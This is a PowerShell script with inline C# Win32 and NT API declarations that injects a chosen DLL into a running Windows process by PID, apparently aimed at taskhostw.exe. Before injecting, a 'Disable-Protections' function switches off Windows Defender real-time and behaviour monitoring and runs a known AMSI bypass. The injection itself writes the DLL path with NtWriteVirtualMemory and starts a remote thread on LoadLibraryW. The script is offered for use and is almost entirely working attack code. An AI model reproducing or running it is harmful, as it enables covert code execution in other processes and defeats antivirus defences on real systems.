# MANUAL DLL INJECTION LIKE PROCESS HACKER
# Uses advanced techniques to bypass protections

param(
    [Parameter(Mandatory=$true)]
    [int]$ProcessPID,
    
    [Parameter(Mandatory=$true)] 
    [string]$DllPath
)

# Advanced Win32 + NT API declarations
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.ComponentModel;

public class AdvancedInjector {
    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    public const uint MEM_COMMIT = 0x00001000;
    public const uint MEM_RESERVE = 0x00002000;
    public const uint PAGE_READWRITE = 0x04;
    public const uint PAGE_EXECUTE_READ = 0x20;
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint NtCreateThreadEx(
        out IntPtr hThread,
        uint dwDesiredAccess,
        IntPtr lpThreadAttributes,
        IntPtr hProcess,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        uint dwStackZeroBits,
        uint dwSizeOfStackCommit,
        uint dwSizeOfStackReserve,
        IntPtr lpBytesBuffer
    );
    
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint NtAllocateVirtualMemory(
        IntPtr hProcess,
        ref IntPtr lpBaseAddress,
        uint dwZeroBits,
        ref uint dwRegionSize,
        uint dwAllocationType,
        uint dwProtect
    );
    
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint NtWriteVirtualMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out uint lpNumberOfBytesWritten
    );
    
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();
    
    public static string GetLastWin32Error() {
        return new Win32Exception(Marshal.GetLastWin32Error()).Message;
    }
}
"@

function Invoke-AdvancedInjection {
    param([int]$TargetPID, [string]$DllPath)
    
    Write-Host "`n🛠️  ADVANCED INJECTION STARTING..." -ForegroundColor Yellow
    Write-Host "Target: PID $TargetPID" -ForegroundColor Cyan
    Write-Host "DLL: $DllPath" -ForegroundColor Cyan
    
    $hProcess = [IntPtr]::Zero
    $hThread = [IntPtr]::Zero
    $allocatedMemory = [IntPtr]::Zero
    
    try {
        Write-Host "`n[Method 1] Standard Win32 Injection..." -ForegroundColor Green
        
        Write-Host "  Opening process..." -ForegroundColor Gray
        $hProcess = [AdvancedInjector]::OpenProcess([AdvancedInjector]::PROCESS_ALL_ACCESS, $false, $TargetPID)
        
        if ($hProcess -eq [IntPtr]::Zero) {
            Write-Host "  ✗ Standard open failed: $([AdvancedInjector]::GetLastWin32Error())" -ForegroundColor Red
            return $false
        }
        Write-Host "  ✓ Process handle: 0x$($hProcess.ToString('X8'))" -ForegroundColor Green
        
        Write-Host "  Allocating memory (NTAPI)..." -ForegroundColor Gray
        $dllPathBytes = [System.Text.Encoding]::Unicode.GetBytes($DllPath + "`0")
        $memSize = [uint32]($dllPathBytes.Length)
        $baseAddr = [IntPtr]::Zero
        
        $ntStatus = [AdvancedInjector]::NtAllocateVirtualMemory(
            $hProcess,
            [ref]$baseAddr,
            0,
            [ref]$memSize,
            [AdvancedInjector]::MEM_COMMIT -bor [AdvancedInjector]::MEM_RESERVE,
            [AdvancedInjector]::PAGE_READWRITE
        )
        
        if ($ntStatus -eq 0) {
            $allocatedMemory = $baseAddr
            Write-Host "  ✓ NTAPI Memory allocated: 0x$($allocatedMemory.ToString('X8'))" -ForegroundColor Green
        } else {
            Write-Host "  ⚠ NTAPI failed, using standard allocation..." -ForegroundColor Yellow
            $allocatedMemory = [AdvancedInjector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $memSize, [AdvancedInjector]::MEM_COMMIT -bor [AdvancedInjector]::MEM_RESERVE, [AdvancedInjector]::PAGE_READWRITE)
            
            if ($allocatedMemory -eq [IntPtr]::Zero) {
                Write-Host "  ✗ Memory allocation failed" -ForegroundColor Red
                return $false
            }
            Write-Host "  ✓ Standard memory allocated: 0x$($allocatedMemory.ToString('X8'))" -ForegroundColor Green
        }
        
        Write-Host "  Writing DLL path (NTAPI)..." -ForegroundColor Gray
        $bytesWritten = 0
        $ntStatus = [AdvancedInjector]::NtWriteVirtualMemory($hProcess, $allocatedMemory, $dllPathBytes, $memSize, [ref]$bytesWritten)
        
        if ($ntStatus -ne 0) {
            Write-Host "  ⚠ NTAPI write failed, using standard..." -ForegroundColor Yellow
            $bytesWrittenPtr = [UIntPtr]::Zero
            $success = [AdvancedInjector]::WriteProcessMemory($hProcess, $allocatedMemory, $dllPathBytes, $memSize, [ref]$bytesWrittenPtr)
            
            if (-not $success) {
                Write-Host "  ✗ Write failed" -ForegroundColor Red
                return $false
            }
            Write-Host "  ✓ Standard write completed" -ForegroundColor Green
        } else {
            Write-Host "  ✓ NTAPI write completed ($bytesWritten bytes)" -ForegroundColor Green
        }
        
        Write-Host "  Getting LoadLibrary address..." -ForegroundColor Gray
        $hKernel32 = [AdvancedInjector]::GetModuleHandle("kernel32.dll")
        $loadLibraryAddr = [AdvancedInjector]::GetProcAddress($hKernel32, "LoadLibraryW")
        Write-Host "  ✓ LoadLibraryW: 0x$($loadLibraryAddr.ToString('X8'))" -ForegroundColor Green
        
        Write-Host "`n[Method 2] NTAPI Thread Creation..." -ForegroundColor Green
        
        $hThread = [IntPtr]::Zero
        $ntStatus = [AdvancedInjector]::NtCreateThreadEx(
            [ref]$hThread,
            0x1FFFFF,
            [IntPtr]::Zero,
            $hProcess,
            $loadLibraryAddr,
            $allocatedMemory,
            0,
            0, 0, 0, [IntPtr]::Zero
        )
        
        if ($ntStatus -eq 0 -and $hThread -ne [IntPtr]::Zero) {
            Write-Host "  ✓ NTAPI thread created: 0x$($hThread.ToString('X8'))" -ForegroundColor Green
        } else {
            Write-Host "  ⚠ NTAPI thread failed, using standard..." -ForegroundColor Yellow
            $hThread = [AdvancedInjector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocatedMemory, 0, [IntPtr]::Zero)
            
            if ($hThread -eq [IntPtr]::Zero) {
                Write-Host "  ✗ Thread creation failed: $([AdvancedInjector]::GetLastWin32Error())" -ForegroundColor Red
                return $false
            }
            Write-Host "  ✓ Standard thread created: 0x$($hThread.ToString('X8'))" -ForegroundColor Green
        }
        
        Write-Host "`n[Final] Waiting for injection..." -ForegroundColor Green
        $waitResult = [AdvancedInjector]::WaitForSingleObject($hThread, 5000)
        
        if ($waitResult -eq 0) {
            Write-Host "  ✓ Injection completed successfully!" -ForegroundColor Green
        } else {
            Write-Host "  ⚠ Thread timeout or still running" -ForegroundColor Yellow
        }
        
        Write-Host "`n" + "="*60 -ForegroundColor Green
        Write-Host "🎉 ADVANCED INJECTION SUCCESSFUL!" -ForegroundColor Green
        Write-Host "="*60 -ForegroundColor Green
        return $true
        
    } catch {
        Write-Host "`n✗ UNEXPECTED ERROR: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    } finally {
        if ($hThread -ne [IntPtr]::Zero) {
            [AdvancedInjector]::CloseHandle($hThread)
        }
        if ($hProcess -ne [IntPtr]::Zero) {
            [AdvancedInjector]::CloseHandle($hProcess)
        }
    }
}

function Disable-Protections {
    Write-Host "`n🛡️  DISABLING PROTECTIONS TEMPORARILY..." -ForegroundColor Yellow
    
    try {
        Write-Host "  Disabling Windows Defender..." -ForegroundColor Gray
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
        
        Write-Host "  Bypassing AMSI..." -ForegroundColor Gray
        $amsiBypass = @"
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true)
"@
        Invoke-Expression $amsiBypass -ErrorAction SilentlyContinue
        
        Write-Host "  ✓ Protections disabled temporarily" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "  ⚠ Could not disable some protections: $($_.Exception.Message)" -ForegroundColor Yellow
        return $false
    }
}

function Enable-Protections {
    Write-Host "`n🛡️  RE-ENABLING PROTECTIONS..." -ForegroundColor Yellow
    
    try {
        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue  
        Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
        Write-Host "  ✓ Protections re-enabled" -ForegroundColor Green
    } catch {
        Write-Host "  ⚠ Could not re-enable some protections" -ForegroundColor Yellow
    }
}

# MAIN EXECUTION
Write-Host "PROCESS HACKER STYLE INJECTOR" -ForegroundColor Magenta
Write-Host "=============================" -ForegroundColor Magenta

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "❌ RUN AS ADMINISTRATOR!" -ForegroundColor Red
    exit 1
}
Write-Host "✓ Running as Administrator" -ForegroundColor Green

if (-not (Test-Path $DllPath)) {
    Write-Host "❌ DLL NOT FOUND: $DllPath" -ForegroundColor Red
    exit 1
}
Write-Host "✓ DLL exists: $DllPath" -ForegroundColor Green

try {
    $process = Get-Process -Id $ProcessPID -ErrorAction Stop
    Write-Host "✓ Target process: $($process.ProcessName) (PID: $ProcessPID)" -ForegroundColor Green
    Write-Host "  Path: $($process.Path)" -ForegroundColor Gray
} catch {
    Write-Host "❌ Process $ProcessPID not found" -ForegroundColor Red
    exit 1
}

Disable-Protections

Write-Host "`n" + "🚀"*30 -ForegroundColor Cyan
Write-Host "STARTING ADVANCED INJECTION..." -ForegroundColor Cyan
Write-Host "🚀"*30 -ForegroundColor Cyan

$success = Invoke-AdvancedInjection -TargetPID $ProcessPID -DllPath $DllPath

Enable-Protections

if ($success) {
    Write-Host "`n🎉 SUCCESS! Process Hacker style injection completed!" -ForegroundColor Green
    Write-Host "The DLL should be loaded in taskhostw.exe" -ForegroundColor Cyan
} else {
    Write-Host "`n❌ FAILED! Even advanced methods couldn't inject." -ForegroundColor Red
    Write-Host "taskhostw.exe is highly protected by Windows." -ForegroundColor Yellow
}
